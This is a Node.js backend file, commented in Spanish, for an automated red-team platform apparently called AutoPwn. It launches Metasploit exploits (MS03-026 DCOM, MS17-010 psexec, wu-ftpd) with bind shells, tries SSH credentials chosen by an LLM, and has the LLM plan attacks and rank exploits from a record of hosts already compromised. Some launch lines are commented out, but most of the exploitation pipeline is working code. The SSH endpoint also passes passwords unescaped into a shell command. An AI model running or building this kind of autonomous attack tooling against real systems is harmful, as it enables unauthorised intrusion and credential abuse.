          "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, ?, 1, ?, ?, 'done')",
          [jobId, hostRowFb.id, rport ?? null, Date.now() - t0, fbLog.slice(-300)]
        );
        const [sr] = await db.execute(
          "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, ?, 'exploit', ?, 'done')",
          [jobId, hostRowFb.id, fbType, fbCve]
        );
        await logActivity(jobId, "session_opened", sr.insertId, "exploit_session",
          { ip, type: fbType, cve: fbCve, module: fbMod, payload: fbPayload },
          { duration_ms: Date.now() - t0, observaciones: `Sesión abierta via fallback fast path — ${fbMod}` }
        );
      } catch (_) {}
    }
    return res.json({ success: true, sessionId: fbSessionId, duration_ms: Date.now() - t0, module: fbMod, payload: fbPayload, output: fbLog });
  };

  // 1. FTP wu-ftpd (puerto 21 / .82)
  if (Number(rport) === 21 || /ftp/i.test(mod)) {
    fullLog += `\n[*] Fallback: wu-ftpd 7350wurm...\n`;
    const ftpRes = await tryFtpExploit(ip);
    fullLog += ftpRes.log;
    if (ftpRes.sessionId) return fbSuccess(ftpRes.sessionId, "shell", "CVE-2000-0573", "wu-ftpd 2.6.1-16 / 7350wurm", null, fullLog);
  }

  // 2. RPC/DCOM ms03_026_dcom (puerto 135 / .48)
  if (Number(rport) === 135 || /dcerpc|dcom|rpc/i.test(mod)) {
    fullLog += `\n[*] Fallback: ms03_026_dcom + windows/shell/bind_tcp:4455...\n`;
    const { output: rOut } = await msfRun([
      "use exploit/windows/dcerpc/ms03_026_dcom",
      // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
      // `set RHOSTS ${ip}`, "set RPORT 135", "set PAYLOAD windows/shell/bind_tcp", "set LPORT 4455", "run -j",
    ], 300000);
    fullLog += rOut;
    await new Promise((r) => setTimeout(r, 15000));
    const { output: rSess } = await msfRun(["sessions -l"], 15000);
    fullLog += "\n" + rSess;
    const rMatches = [...joinSessionLines(stripAnsi(rSess)).matchAll(new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ipEscaped}`, "gmi"))];
    const rRow = rMatches.at(-1) ?? null;
    const rText = (rOut + rSess).match(/(meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
    if (rRow || rText) {
      const sid = ++sessionCounter;
      const mId = rRow ? rRow[1] : rText[2];
      activeSessions[sid] = { msfId: mId, type: rRow ? rRow[2] : "shell", ip, cve: "CVE-2003-0352" };
      return fbSuccess(sid, rRow ? rRow[2] : "shell", "CVE-2003-0352", "exploit/windows/dcerpc/ms03_026_dcom", "windows/shell/bind_tcp", fullLog);
    }
  }

  // 3. SMB anónimo ms17_010_psexec (puerto 445 / .53)
  if (Number(rport) === 445 || /smb|psexec|eternalblue/i.test(mod)) {
    fullLog += `\n[*] Fallback: ms17_010_psexec + anonymous + windows/x64/shell_bind_tcp:4455...\n`;
    const { output: sOut } = await msfRun([
      "use exploit/windows/smb/ms17_010_psexec",
      // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
      // `set RHOSTS ${ip}`, "set RPORT 445", "set SMBUser anonymous", "set SMBPass ''", "set PAYLOAD windows/x64/shell_bind_tcp", "set LPORT 4455", "run -j",
    ], 300000);
    fullLog += sOut;
    await new Promise((r) => setTimeout(r, 15000));
    const { output: sSess } = await msfRun(["sessions -l"], 15000);
    fullLog += "\n" + sSess;
    const sMatches = [...joinSessionLines(stripAnsi(sSess)).matchAll(new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ipEscaped}`, "gmi"))];
    const sRow = sMatches.at(-1) ?? null;
    const sText = (sOut + sSess).match(/(meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
    if (sRow || sText) {
      const sid = ++sessionCounter;
      const mId = sRow ? sRow[1] : sText[2];
      activeSessions[sid] = { msfId: mId, type: sRow ? sRow[2] : "shell", ip, cve: "CVE-2017-0145" };
      return fbSuccess(sid, sRow ? sRow[2] : "shell", "CVE-2017-0145", "exploit/windows/smb/ms17_010_psexec", "windows/x64/shell_bind_tcp", fullLog);
    }
  }

  res.json({ success: false, duration_ms: Date.now() - t0, module: mod, payload: payload ?? null, output: fullLog });
});

// POST /run-ssh — prueba UNA credencial SSH concreta contra UN host
// La IA decide qué usuario y contraseña probar; esta función solo los ejecuta y mide.
app.post("/run-ssh", async (req, res) => {
  const { ip, user, password, jobId } = req.body;

  if (!ip || !user || !password) {
    return res.status(400).json({ error: "Faltan parámetros: ip, user, password" });
  }
  if (!/^[\d.]+$/.test(ip)) {
    return res.status(400).json({ error: "IP inválida" });
  }

  const t0     = Date.now();
  const result = await sshExec(user, ip, password, "echo AUTOPWN_OK", 12000);
  const duration_ms = Date.now() - t0;

  if (result.stdout.includes("AUTOPWN_OK")) {
    const sessionId = ++sessionCounter;
    activeSessions[sessionId] = { type: "ssh", ip, user, password, msfId: null };
    console.log(`[run-ssh] Session ${sessionId} opened as ${user}@${ip} in ${duration_ms}ms`);

    if (jobId) {
      try {
        const [[hostRow]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
        if (hostRow) {
          await db.execute(
            "INSERT INTO ssh_attempt (jobs_id, host_id, user, password, success, duration_ms, state) VALUES (?, ?, ?, ?, 1, ?, 'done')",
            [jobId, hostRow.id, user, password, duration_ms]
          );
          await db.execute(
            "INSERT INTO exploit_session (jobs_id, host_id, type, method, user, state, duration_ms) VALUES (?, ?, 'ssh', 'ssh', ?, 'done', ?)",
            [jobId, hostRow.id, user, duration_ms]
          );
        }
      } catch (dbErr) { console.error("[run-ssh] Error BD:", dbErr.message); }
    }

    return res.json({ success: true, sessionId, duration_ms, user, password });
  }

  if (jobId) {
    try {
      const [[hostRow]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
      if (hostRow) {
        await db.execute(
          "INSERT INTO ssh_attempt (jobs_id, host_id, user, password, success, duration_ms, state) VALUES (?, ?, ?, ?, 0, ?, 'done')",
          [jobId, hostRow.id, user, password, duration_ms]
        );
      }
    } catch (dbErr) { console.error("[run-ssh] Error BD:", dbErr.message); }
  }

  const reason = (result.stderr + result.stdout).replace(/\n/g, " ").trim().slice(0, 120);
  console.log(`[run-ssh] Failed ${user}@${ip} in ${duration_ms}ms`);
  res.json({ success: false, duration_ms, user, password, reason });
});

// POST /msf-search — consulta Metasploit en tiempo real para un CVE dado.
// Devuelve todos los módulos encontrados ordenados por rank.
// La IA lo usa para descubrir qué módulo llamar antes de /run-exploit.
// El usuario lo dispara implícitamente al pulsar "Explotar" en la web.
app.post("/msf-search", async (req, res) => {
  const { cve } = req.body;
  if (!cve || !/^CVE-\d{4}-\d+$/i.test(cve)) {
    return res.status(400).json({ error: "Parámetro 'cve' inválido (formato: CVE-YYYY-NNNNN)" });
  }

  const cveUpper = cve.toUpperCase();

  // Mapa estático tiene prioridad — evita arrancar msfconsole para CVEs conocidos
  if (CVE_MODULES[cveUpper] !== undefined) {
    const entry = CVE_MODULES[cveUpper];
    if (!entry.module) {
      return res.json({ cve: cveUpper, source: "static", modules: [] });
    }
    return res.json({
      cve: cveUpper,
      source: "static",
      modules: [{ name: entry.module, rank: "excellent", payload: entry.payload ?? guessPayload(entry.module), description: "" }],
    });
  }

  // CVE desconocido → búsqueda en vivo en msfconsole
  const cveNum = cveUpper.replace(/^CVE-/i, "");
  const { output, timedOut } = await msfRun([`search cve:${cveNum}`], 35000);

  if (timedOut) {
    return res.status(504).json({ error: "Metasploit search timed out" });
  }

  const clean = stripAnsi(output);

  // Formato de fila: "  0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  VSFTPD..."
  const rowRe = /^\s*\d+\s+((?:exploit|auxiliary)\/\S+)\s+\S+\s+(\w+)\s+\S+\s+(.*)/gm;
  const modules = [];
  let m;
  while ((m = rowRe.exec(clean)) !== null) {
    modules.push({
      name: m[1],
      rank: m[2].toLowerCase(),
      payload: guessPayload(m[1]),
      description: m[3].trim(),
    });
  }

  // exploit/ primero, luego por rank
  const rankOrder = { excellent: 0, great: 1, good: 2, normal: 3, average: 4, low: 5 };
  modules.sort((a, b) => {
    const ae = a.name.startsWith("exploit/") ? 0 : 1;
    const be = b.name.startsWith("exploit/") ? 0 : 1;
    if (ae !== be) return ae - be;
    return (rankOrder[a.rank] ?? 99) - (rankOrder[b.rank] ?? 99);
  });

  res.json({ cve: cveUpper, source: "dynamic", modules });
});

// ══════════════════════════════════════════════════════════════════════════════
// POST /host-cache — devuelve puertos y vulns cacheados para una lista de IPs
// Permite a la IA saltar los agentes de recon y vuln cuando ya hay datos en BD
// ══════════════════════════════════════════════════════════════════════════════
app.post("/host-cache", async (req, res) => {
  const { ips = [] } = req.body;
  if (!ips.length) return res.json({ cache: {} });

  try {
    const ph = ips.map(() => "?").join(",");

    // Puertos del job más reciente por IP
    const [nmapRows] = await db.execute(
      `SELECT h2.target_host, n.port, n.nmap_service AS service, n.nmap_version AS version, h2.os_info
       FROM host_nmap n
       JOIN hosts h2 ON n.host_id = h2.id
       JOIN (
         SELECT h3.target_host, MAX(h3.jobs_id) AS latest_job
         FROM hosts h3
         INNER JOIN host_nmap n3 ON n3.host_id = h3.id
         WHERE h3.target_host IN (${ph})
         GROUP BY h3.target_host
       ) best ON h2.target_host = best.target_host AND h2.jobs_id = best.latest_job
       ORDER BY h2.target_host, n.port`,
      ips
    );

    // Vulns del job más reciente por IP
    const [vulnRows] = await db.execute(
      `SELECT h2.target_host, v.cve, v.severity, v.service, n.port
       FROM host_vuln v
       JOIN hosts h2 ON v.host_id = h2.id
       LEFT JOIN host_nmap n ON v.host_nmap_id = n.id
       JOIN (
         SELECT h3.target_host, MAX(h3.jobs_id) AS latest_job
         FROM hosts h3
         INNER JOIN host_vuln v3 ON v3.host_id = h3.id
         WHERE h3.target_host IN (${ph})
         GROUP BY h3.target_host
       ) best ON h2.target_host = best.target_host AND h2.jobs_id = best.latest_job
       ORDER BY h2.target_host, v.severity, n.port`,
      ips
    );

    // Organizar por IP
    const cache = {};
    for (const r of nmapRows) {
      if (!cache[r.target_host]) cache[r.target_host] = { ports: [], vulns: [], osInfo: r.os_info ?? null };
      cache[r.target_host].ports.push({ port: r.port, service: r.service, version: r.version });
    }
    for (const r of vulnRows) {
      if (!cache[r.target_host]) cache[r.target_host] = { ports: [], vulns: [], osInfo: null };
      cache[r.target_host].vulns.push({ cve: r.cve, severity: r.severity, service: r.service, port: r.port });
    }

    const hits = Object.keys(cache);
    console.log(`[host-cache] ${hits.length} host(s) con datos en BD: ${hits.join(", ")}`);
    res.json({ cache });
  } catch (e) {
    console.error("[host-cache] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// GET /ai-context — devuelve el historial de la BD para que la IA razone
// ══════════════════════════════════════════════════════════════════════════════
app.get("/ai-context", async (_req, res) => {
  try {
    // Hosts que se comprometieron: IP + puerto + CVEs usados + fecha
    const [compromised] = await db.execute(`
      SELECT h.target_host AS ip, es.cve, es.type, es.method,
             DATE_FORMAT(MAX(es.timestamp), '%Y-%m-%d') AS last_success
      FROM exploit_session es
      JOIN hosts h ON es.host_id = h.id
      GROUP BY h.target_host, es.cve, es.type, es.method
      ORDER BY last_success DESC
    `);

    // Patrones: qué puerto + CVE ha tenido éxito históricamente
    const [successPatterns] = await db.execute(`
      SELECT ea.port, COUNT(*) AS total_intentos, SUM(ea.success) AS exitos
      FROM exploit_attempt ea
      GROUP BY ea.port
      ORDER BY exitos DESC
    `);

    // CVEs que han funcionado (desde exploit_session)
    const [workingCves] = await db.execute(`
      SELECT es.cve, COUNT(*) AS veces, GROUP_CONCAT(DISTINCT h.target_host) AS hosts
      FROM exploit_session es
      JOIN hosts h ON es.host_id = h.id
      WHERE es.cve IS NOT NULL
      GROUP BY es.cve
      ORDER BY veces DESC
    `);

    // IPs con solo fallos (intentaron pero nunca éxito)
    const [onlyFailed] = await db.execute(`
      SELECT h.target_host AS ip, ea.port, COUNT(*) AS intentos_fallidos
      FROM exploit_attempt ea
      JOIN hosts h ON ea.host_id = h.id
      WHERE ea.success = 0
        AND NOT EXISTS (
          SELECT 1 FROM exploit_attempt ea2
          WHERE ea2.host_id = ea.host_id AND ea2.success = 1
        )
      GROUP BY h.target_host, ea.port
      ORDER BY intentos_fallidos DESC
    `);

    // Combinaciones ganadoras exactas: leemos el módulo y payload REALES del campo output
    // (msf_modules_id y msf_payloads_id son NULL, pero output tiene el texto completo)
    // Formato: "module: exploit/... | payload: windows/... | result: Session opened"
    const [successRows] = await db.execute(`
      SELECT h.target_host AS ip,
             ea.port,
             ea.output,
             DATE_FORMAT(ea.timestamp, '%Y-%m-%d') AS last_success,
             es.cve,
             es.type AS session_type
      FROM exploit_attempt ea
      JOIN hosts h ON ea.host_id = h.id
      LEFT JOIN exploit_session es
             ON es.host_id = ea.host_id AND es.jobs_id = ea.jobs_id
      WHERE ea.success = 1
        AND ea.output IS NOT NULL AND ea.output != ''
      ORDER BY ea.timestamp DESC
    `);

    const parseAttemptOutput = (output) => {
      // Captura tanto "module: exploit/..." como "module: wu-ftpd ... / 7350wurm"
      const modM = (output || "").match(/module:\s*([^|]+?)(?:\s*\||$)/i);
      const payM = (output || "").match(/payload:\s*([a-z0-9/_]+)/);
      return { module: modM?.[1]?.trim() ?? null, payload: payM?.[1] ?? null };
    };

    // Dedup por ip+module+payload — el mismo combo exacto no hace falta intentarlo dos veces
    const winningCombinations = [];
    const _wcSeen = new Set();
    for (const row of successRows) {
      const { module, payload } = parseAttemptOutput(row.output);
      if (!module) continue;
      const key = `${row.ip}|${module}|${payload ?? "self-contained"}`;
      if (_wcSeen.has(key)) continue;
      _wcSeen.add(key);
      winningCombinations.push({
        ip:           row.ip,
        cve:          row.cve,
        module,
        port:         row.port ?? 445,
        session_type: row.session_type,
        payloads:     [payload],   // payload EXACTO que funcionó, sin inferencias
        last_success: row.last_success,
      });
    }

    res.json({ compromised, successPatterns, workingCves, onlyFailed, winningCombinations });
  } catch (e) {
    console.error("[ai-context] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════════════════════
// POST /ai-chat — chat libre con Aracni (respuesta en texto plano)
// ══════════════════════════════════════════════════════════════════════════════
app.post("/ai-chat", async (req, res) => {
  const { prompt, historial = [] } = req.body;
  if (!prompt) return res.status(400).json({ error: "Falta el parámetro 'prompt'" });

  try {
    const config = require("./ia_config");
    const url    = config.llama_api_url;
    const model  = config.ia_modelo;

    // Construye contexto de conversación previa
    const historialStr = historial.length > 0
      ? historial.slice(-6).map(m => `${m.role === "user" ? "User" : "Aracni"}: ${m.text}`).join("\n") + "\n"
      : "";

    const systemPrompt = `You are Aracni, an expert cybersecurity and penetration testing assistant embedded in AutoPwn, an automated red-team platform. Answer clearly and concisely. You can help with vulnerabilities, CVEs, exploits, payloads, Metasploit modules, network concepts, and attack strategies. Respond in the same language the user writes in.`;

    const fullPrompt = `${systemPrompt}\n\n${historialStr}User: ${prompt}\nAracni:`;

    const response = await fetch(url, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ model, prompt: fullPrompt, stream: false }),
    });

    if (!response.ok) throw new Error(`Ollama HTTP ${response.status}`);

    const data = await response.json();
    const respuesta = (data.response ?? "").trim();

    res.json({ respuesta });
  } catch (e) {
    console.error("[ai-chat] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /ai-plan — IA planifica el ataque dado los hosts descubiertos + contexto BD
// ══════════════════════════════════════════════════════════════════════════════
app.post("/ai-plan", async (req, res) => {
  const { hosts = [] } = req.body;
  const contexto = req.body.contexto ?? {};
  if (!hosts.length) return res.status(400).json({ error: "Falta lista de hosts" });

  try {
    const { ia_planificar_ataque } = require("./ia_funciones_especificas");
    const result = await ia_planificar_ataque(hosts, contexto);
    if (result === -1)
      return res.status(500).json({ error: "La IA no pudo planificar el ataque" });
    res.json(result);
  } catch (e) {
    console.error("[ai-plan] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// POST /ai-analyze — IA analiza host y devuelve priorización de exploits
// ══════════════════════════════════════════════════════════════════════════════
app.post("/ai-analyze", async (req, res) => {
  const { ip, services = [], vulns = [], contexto = null, cacheHost = null } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta el parámetro 'ip'" });

  try {
    const { ia_analizar_vulnerabilidades } = require("./ia_funciones_especificas");
    const result = await ia_analizar_vulnerabilidades(ip, services, vulns, contexto, cacheHost);
    if (result === -1)
      return res.status(500).json({ error: "La IA no pudo analizar el host" });
    res.json(result);
  } catch (e) {
    console.error("[ai-analyze] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /ai-next — IA sugiere el siguiente paso dado el estado actual del ataque
app.post("/ai-next", async (req, res) => {
  const { ip, ports = [], vulns = [], historial = [] } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta el parámetro 'ip'" });

  try {
    const { ia_sugerir_siguiente_paso } = require("./ia_funciones_especificas");
    const result = await ia_sugerir_siguiente_paso(ip, ports, vulns, historial);
    if (result === -1)
      return res.status(500).json({ error: "La IA no pudo sugerir el siguiente paso" });
    res.json(result);
  } catch (e) {
    console.error("[ai-next] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /ai-report — IA genera informe ejecutivo de un host
app.post("/ai-report", async (req, res) => {
  const { ip, resultados = {} } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta el parámetro 'ip'" });

  try {
    const { ia_generar_informe_host } = require("./ia_funciones_especificas");
    const result = await ia_generar_informe_host(ip, resultados);
    if (result === -1)
      return res.status(500).json({ error: "La IA no pudo generar el informe" });
    res.json(result);
  } catch (e) {
    console.error("[ai-report] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// SESIONES PERSISTENTES — almacenamiento en fichero JSON
// ══════════════════════════════════════════════════════════════════════════════
const PERSIST_FILE = path.join(__dirname, "persistent_sessions.json");

function loadPersistentSessions() {
  try { return JSON.parse(fs.readFileSync(PERSIST_FILE, "utf8")); } catch { return []; }
}

function savePersistentSession(entry) {
  const sessions = loadPersistentSessions();
  const idx = sessions.findIndex(s => s.ip === entry.ip && s.user === entry.user);
  if (idx >= 0) sessions[idx] = entry;
  else sessions.push(entry);
  fs.writeFileSync(PERSIST_FILE, JSON.stringify(sessions, null, 2));
}

// GET /persistent-sessions — lista de sesiones persistentes guardadas
app.get("/persistent-sessions", (_req, res) => {
  res.json({ sessions: loadPersistentSessions() });
});

// DELETE /persistent-sessions — limpia todas las sesiones persistentes
app.delete("/persistent-sessions", (_req, res) => {
  fs.writeFileSync(PERSIST_FILE, "[]");
  console.log("[persist] Sesiones persistentes borradas manualmente");
  res.json({ ok: true });
});

// DELETE /persistent-session — borra una sesión persistente concreta
app.delete("/persistent-session", (req, res) => {
  const { ip, user } = req.body;
  if (!ip) return res.status(400).json({ error: "Falta ip" });
  const sessions = loadPersistentSessions().filter(s => !(s.ip === ip && s.user === user));
  fs.writeFileSync(PERSIST_FILE, JSON.stringify(sessions, null, 2));
  console.log(`[persist] Sesión ${user}@${ip} eliminada`);
  res.json({ ok: true });
});

// Auto-limpieza a las 6:00, 8:00 y 10:00 (reinicio de máquinas del lab)
const CLEAR_HOURS = new Set([6, 8, 10]);
let lastClearHour = -1;
setInterval(() => {
  const now = new Date();
  const h = now.getHours();
  const m = now.getMinutes();
  if (m === 0 && CLEAR_HOURS.has(h) && lastClearHour !== h) {
    lastClearHour = h;
    fs.writeFileSync(PERSIST_FILE, "[]");
    console.log(`[persist] Auto-limpieza a las ${h}:00 — sesiones persistentes borradas`);
  }
}, 30000); // comprueba cada 30s para no perderse el minuto exacto

// POST /rdp-connect — lanza cliente RDP en modo detached (abre ventana en el escritorio)
// rdpClient="xfreerdp3" se usa para Windows 2012 R2 (NLA required); resto usa rdesktop.
app.post("/rdp-connect", (req, res) => {
  const { ip, user, password, rdpClient } = req.body;
  if (!ip || !user || !password) return res.status(400).json({ error: "Faltan parámetros" });

  let exe, args, cmd;
  if (rdpClient === "xfreerdp3") {
    exe  = "xfreerdp3";
    args = [`/v:${ip}`, `/u:${user}`, `/p:${password}`, "/cert:ignore", "/sec:rdp", "/dynamic-resolution", "/clipboard"];
    cmd  = `xfreerdp3 /v:${ip} /u:${user} /p:*** /cert:ignore`;
  } else {
    exe  = "rdesktop";
    args = ["-u", user, "-p", password, "-0", "-a", "16", ip];
    cmd  = `rdesktop -u ${user} -p *** -0 ${ip}`;
  }

  const proc = require("child_process").spawn(exe, args, { detached: true, stdio: "ignore" });
  let responded = false;

  proc.on("error", (e) => {
    if (responded) return;
    responded = true;
    const msg = e.code === "ENOENT"
      ? `Herramienta '${exe}' no encontrada. Instálala con: ${exe === "xfreerdp3" ? "sudo apt install freerdp3-x11" : "sudo apt install rdesktop"}`
      : e.message;
    console.error(`[rdp-connect] Error: ${msg}`);
    res.json({ ok: false, cmd, error: msg });
  });

  setTimeout(() => {
    if (responded) return;
    responded = true;
    proc.unref();
    console.log(`[rdp-connect] Lanzado: ${cmd}`);
    res.json({ ok: true, cmd });
  }, 400);
});

app.post("/ssh-connect", (req, res) => {
  const { ip, user, password } = req.body;
  if (!ip || !user || !password) return res.status(400).json({ error: "Faltan parámetros" });
  const sshCmd = `sshpass -p '${password}' ssh -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc ${user}@${ip}`;
  const terminals = [
    ["x-terminal-emulator", ["-e", "bash", "-c", sshCmd]],
    ["xfce4-terminal", ["--command", `bash -c '${sshCmd}'`]],
    ["gnome-terminal", ["--", "bash", "-c", sshCmd]],
    ["konsole", ["-e", "bash", "-c", sshCmd]],
    ["xterm", ["-e", "bash", "-c", sshCmd]],
  ];
  let launched = false;
  for (const [bin, args] of terminals) {
    try {
      const proc = spawn(bin, args, { detached: true, stdio: "ignore" });
      proc.unref();
      console.log(`[ssh-connect] Lanzado con ${bin}: ${sshCmd}`);
      launched = true;
      break;
    } catch { /* try next */ }
  }
  if (launched) res.json({ ok: true });
  else res.json({ ok: false, error: "No se encontró ningún emulador de terminal (instala xterm o xfce4-terminal)" });
});

// ══════════════════════════════════════════════════════════════════════════════

app.listen(port, () => {
  console.log(`Servidor escuchando en http://localhost:${port}`);
});
